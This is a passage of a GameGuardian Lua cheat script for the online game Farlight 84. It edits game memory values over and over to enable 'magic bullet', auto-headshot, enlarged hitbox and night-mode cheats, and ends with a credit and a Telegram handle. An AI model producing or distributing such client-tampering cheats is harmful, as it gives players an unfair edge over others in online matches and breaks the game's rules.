gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""7.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""5.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""4,557,642,823,998,111,744"", gg.TYPE_QWORD)
gg.getResults(9999)
gg.editAll(""4557642824019345408"", gg.TYPE_QWORD)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.1875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.75"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""7.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""5.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""4,557,642,823,998,111,744"", gg.TYPE_QWORD)
gg.getResults(9999)
gg.editAll(""4557642824019345408"", gg.TYPE_QWORD)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.1875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.75"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""7.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""5.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""4,557,642,823,998,111,744"", gg.TYPE_QWORD)
gg.getResults(9999)
gg.editAll(""4557642824019345408"", gg.TYPE_QWORD)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.1875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.75"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""7.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""5.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""4,557,642,823,998,111,744"", gg.TYPE_QWORD)
gg.getResults(9999)
gg.editAll(""4557642824019345408"", gg.TYPE_QWORD)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.1875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.75"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""7.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""5.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""4,557,642,823,998,111,744"", gg.TYPE_QWORD)
gg.getResults(9999)
gg.editAll(""4557642824019345408"", gg.TYPE_QWORD)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.1875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.75"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""7.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""5.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""4,557,642,823,998,111,744"", gg.TYPE_QWORD)
gg.getResults(9999)
gg.editAll(""4557642824019345408"", gg.TYPE_QWORD)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.1875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.75"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""7.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""5.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""4,557,642,823,998,111,744"", gg.TYPE_QWORD)
gg.getResults(9999)
gg.editAll(""4557642824019345408"", gg.TYPE_QWORD)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.1875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.75"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""7.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""5.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""4,557,642,823,998,111,744"", gg.TYPE_QWORD)
gg.getResults(9999)
gg.editAll(""4557642824019345408"", gg.TYPE_QWORD)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.1875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.75"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""7.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""5.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""4,557,642,823,998,111,744"", gg.TYPE_QWORD)
gg.getResults(9999)
gg.editAll(""4557642824019345408"", gg.TYPE_QWORD)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.1875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.75"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""7.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""5.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""4,557,642,823,998,111,744"", gg.TYPE_QWORD)
gg.getResults(9999)
gg.editAll(""4557642824019345408"", gg.TYPE_QWORD)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.1875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.75"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""7.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""5.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""4,557,642,823,998,111,744"", gg.TYPE_QWORD)
gg.getResults(9999)
gg.editAll(""4557642824019345408"", gg.TYPE_QWORD)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.1875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.75"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""7.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""5.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""4,557,642,823,998,111,744"", gg.TYPE_QWORD)
gg.getResults(9999)
gg.editAll(""4557642824019345408"", gg.TYPE_QWORD)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.1875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.75"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""7.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""5.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""4,557,642,823,998,111,744"", gg.TYPE_QWORD)
gg.getResults(9999)
gg.editAll(""4557642824019345408"", gg.TYPE_QWORD)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.1875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.75"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""7.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""5.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""4,557,642,823,998,111,744"", gg.TYPE_QWORD)
gg.getResults(9999)
gg.editAll(""4557642824019345408"", gg.TYPE_QWORD)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.1875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.75"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""7.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""5.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""4,557,642,823,998,111,744"", gg.TYPE_QWORD)
gg.getResults(9999)
gg.editAll(""4557642824019345408"", gg.TYPE_QWORD)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.1875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.75"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""7.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""5.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""4,557,642,823,998,111,744"", gg.TYPE_QWORD)
gg.getResults(9999)
gg.editAll(""4557642824019345408"", gg.TYPE_QWORD)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.1875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""6.75"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""7.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""5.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""MB"")
gg.searchNumber(""4,557,642,823,998,111,744"", gg.TYPE_QWORD)
gg.getResults(9999)
gg.editAll(""4557642824019345408"", gg.TYPE_QWORD)
gg.clearResults()
gg.toast(""MB"")
gg.alert(""تم تفعيل الماجك بولت ✅"")
end


function MG2()
gg.setRanges(gg.REGION_ANONYMOUS)
gg.searchNumber(""6.875"", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.getResults(50, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""90"", gg.TYPE_FLOAT)
gg.clearResults()
gg.setRanges(gg.REGION_ANONYMOUS)
gg.searchNumber(""6.1875"", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.getResults(50, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""90"", gg.TYPE_FLOAT)
gg.clearResults()
gg.setRanges(gg.REGION_ANONYMOUS)
gg.searchNumber(""6.75"", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.getResults(50, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""90"", gg.TYPE_FLOAT)
gg.clearResults()
gg.setRanges(gg.REGION_ANONYMOUS)
gg.searchNumber(""16.5"", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.getResults(50, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""90"", gg.TYPE_FLOAT)
gg.clearResults()
gg.setRanges(gg.REGION_ANONYMOUS)
gg.searchNumber(""7.5"", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1, 0)
gg.getResults(50, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""90"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""Magic Bullet No Loop On V2 "")
end


function MG3()
gg.clearResults()
gg.clearResults()
gg.setRanges(gg.REGION_ANONYMOUS)
gg.clearResults()
gg.setVisible()
gg.searchNumber(""15.125"", gg.TYPE_FLOAT)
gg.clearResults()
gg.getResults(9999999)
gg.editAll(""95"", gg.TYPE_FLOAT)
gg.toast(""تم تفعيل الماجك بولت V3 > "") 
end



function F6()
gg.setRanges(gg.REGION_ANONYMOUS)
gg.clearResults()
gg.setVisible(false)
gg.searchNumber(""16.5"", gg.TYPE_FLOAT)
gg.clearResults()
gg.refineNumber(""16.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""90"", gg.TYPE_FLOAT)
gg.clearResults()
gg.setVisible(false)
gg.setRanges(gg.REGION_ANONYMOUS)
gg.clearResults()
gg.setVisible(false)
gg.searchNumber(""6.50295305252"", gg.TYPE_FLOAT)
gg.clearResults()
gg.getResults(9999)
gg.editAll(""90"", gg.TYPE_FLOAT)
gg.clearResults()
gg.setVisible(false)
gg.setRanges(gg.REGION_ANONYMOUS)
gg.clearResults()
gg.setVisible(false)
gg.searchNumber(""2~10000D;15~15.9;1;0~999999D:17"", gg.TYPE_FLOAT)
gg.clearResults()
gg.refineNumber(""15.0"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""90"", gg.TYPE_FLOAT)
gg.clearResults()
gg.clearResults()
gg.toast(""HitBox"")
end

function F7()
gg.setRanges(gg.REGION_C_DATA)
gg.searchNumber(""0.0;1.0;1.0;1.0;1.0;0.5;0.5;0.5::29"", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1, 0)
revert = gg.getResults(999, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""0"", gg.TYPE_FLOAT)
gg.toast(""NightMode On"")
end

function F8()
gg.setRanges(gg.REGION_ANONYMOUS)
gg.searchNumber(""4,557,642,823,998,111,744"", gg.TYPE_QWORD)
gg.getResults(9999)
gg.editAll(""4557642824019345408"", gg.TYPE_QWORD)
gg.clearResults()
gg.toast(""ITACHI"")
gg.setRanges(gg.REGION_ANONYMOUS)
gg.searchNumber(""6.875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""ITACHI"")
gg.setRanges(gg.REGION_ANONYMOUS)
gg.searchNumber(""6.1875"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""ITACHI"")
gg.setRanges(gg.REGION_ANONYMOUS)
gg.searchNumber(""6.75"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""ITACHI"")
gg.setRanges(gg.REGION_ANONYMOUS)
gg.searchNumber(""7.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""ITACHI"")
gg.setRanges(gg.REGION_ANONYMOUS)
gg.searchNumber(""5.5"", gg.TYPE_FLOAT)
gg.getResults(9999)
gg.editAll(""100"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast(""AutoHead On"")
end

function Exit()
print(""Alvan hack FARLIGHT 84 Telegram @ESPSMG1 "")
gg.skipRestoreState()
  os.exit()
  gg.setVisible(true)
end 

while true do
  if gg.isVisible(true) then
    PUBGMH = 1
    gg.setVisible(false)
  end
  gg.clearResults()
  if PUBGMH == 1 then
    HOME()
 end
 end"
